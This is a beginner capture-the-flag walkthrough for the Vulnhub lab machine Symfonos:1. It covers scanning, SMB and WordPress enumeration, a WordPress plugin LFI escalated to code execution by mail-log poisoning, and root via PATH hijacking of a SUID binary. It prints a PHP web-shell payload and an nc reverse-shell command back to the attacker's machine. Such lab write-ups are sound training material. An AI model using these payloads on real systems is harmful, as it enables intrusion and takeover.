# Symfonos:1 - Writeup 

Symfonos:1 is a beginner real-life based machine from Vulnhub by Zayotic.<br />
It's designed to teach an interesting way of obtaining a low priv shell.<br />
Note: You may need to update your host file for `symfonos.local`.

Link to the machine: [https://www.vulnhub.com/entry/symfonos-1,322/](https://www.vulnhub.com/entry/symfonos-1,322/)
<br />

## Target Identify

Let's start by identifying our target IP address.

```
fping -agq 10.10.10.0/24
10.10.10.1
10.10.10.2
10.10.10.9
```

<br />

## Port scanning

Before we start our scans, add `symfonos.local` to `/etc/hosts` file.

![](Pics/hosts.png)
<br />
<br />

Now, let's scan for open ports, running services, and version detection.

```
┌─[a7@Parrot]─[~/Desktop/vulnHub/symfonos:1]
└──╼ $sudo nmap -p- -sV -sC -O -oN nmap.log symfonos.local
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for symfonos.local (10.10.10.9)
Host is up (0.00024s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:32:ED:0B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4h59m58s, deviation: 3h27m50s, median: 2h59m58s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-12-08T17:20:10
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|_  FQDN: symfonos

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
┌─[a7@Parrot]─[~/Desktop/vulnHub/symfonos:1]
└──╼ $
```
<br />


## Enumeration

First, let's visit the web server.

![](Pics/web.png)
<br />
<br />

Just a picture and nothing is found in the source code, download the picture for more analysis.

![](Pics/pic.png)
<br />
<br />

Nothing was found in the image. Launch `gobuster` and `nikto`.

![](Pics/enum.png)
<br />
<br />

Nothing. Ok, let's enumerate `SMB` with `smbclint -L` to list all shared on the target.<br />
When it asks for a password, just press `Enter`.

![](Pics/smb.png)
<br />
<br />

We got `anonymous` which is accessible as "anonymous" user, and `helios` with a comment `"Helios personal share"`, we need a password to access it.<br />
Let's access `anonymous`, and when it asks for a password, just press `Enter`.

![](Pics/smb2.png)
<br />
<br />

We got a text file `attention.txt` which contains a hint that users are using passwords like [epidioko, qwerty, baseball].<br />

Let's try to access `Helios` shares with user `Helios` and those passwords.

![](Pics/smb3.png)
<br />
<br />

There's `/h3l105` which is possibly a directory, let's browse it.

![](Pics/web2.png)
<br />
<br />

It's just another WordPress.<br />
Let's scan the WordPress site for know vulnerable plugins, themes, and user enumeration.<br />
We need to supply an api_token for the vulnerability scan. To obtain one, register an account on [WPScan.com](https://wpscan.com/)<br />
Now, supply your API_token in cli `wpscan --url http://symfonos.local/h3l105/ --api-token YOUR_TOKEN -e vp,vt,u` <br />or via a configuration file.

![](Pics/api.png)
<br />
<br />

Launch `wpscan`.

![](Pics/wpscan.png)
<br />
<br />

We have an Unauthenticated LFI vulnerability.

![](Pics/wpscan2.png)
<br />
<br />

Let's check the first reference link.

![](Pics/poc.png)
<br />
<br />

We have a POC, let's try it.

![](Pics/poc2.png)
<br />
<br />

Great! So, what next?<br />
<br />

We still have one service we didn't enumerate, `SMTP`.

![](Pics/smtp.png)
<br />
<br />

## Getting Access

Now, We have LFI, and we want to escalate it to RCE by "Log Poisoning".<br />
We have three ways to get RCE via Log Poisoning:
- Apache Log File Poisoning.
- SSH Log File Poisoning.
- SMTP Log File Poisoning.

Let's try to include the `/var/Mail/helios` and if it works, we'll poison the `Mail Log File` to get remote code execution.

![](Pics/lfi.png)
<br />

Now, we'll inject a php code in `/var/Mail/helios`.<br />
The code is `<?php system($_GET['exp']); ?>`

![](Pics/lfi2.png)
<br />
<br />

Now, back to the browser, execute the command `&exp=id`.

![](Pics/lfi3.png)
<br />
<br />

Let's get a reverse shell, start a listener and connect back to our machine.<br/>
`nc 10.10.10.2 1234 -e /bin/sh`

![](Pics/shell.png)
<br />
<br />

## Root Access

There's a binary with `SUID` permission under `/opt`.

![](Pics/shell2.png)
<br />
<br />

After analyzing this binary and extracting the metadata, This binary call curl to send a `HEAD` request to the localhost.

![](Pics/shell3.png)
<br />
<br />

We could abuse it by creating an executable file called "curl" containing `/bin/sh` and exporting its path.

![](Pics/root.png)
<br />